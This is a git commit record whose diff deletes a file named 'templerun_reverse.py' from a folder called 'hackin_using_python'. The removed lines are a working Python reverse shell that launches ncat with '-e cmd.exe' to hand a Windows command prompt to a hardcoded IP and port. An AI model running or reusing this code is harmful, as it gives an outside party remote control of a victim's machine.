f81c15ceebcfa8716187279eb8eea425c662d460
Shamiinnocent <122034561+Shamiinnocent@users.noreply.github.com>
2025-03-17 11:24:29 +0200

    removing redudant directory

--- hackin_using_python/templerun_reverse.py
+++
@@ -1,6 +0,0 @@
-import subprocess
-client_ip= "10.12.75.36"
-port = "9999"
-subprocess.Popen(["ncat", client_ip, port, "-e","cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-
-
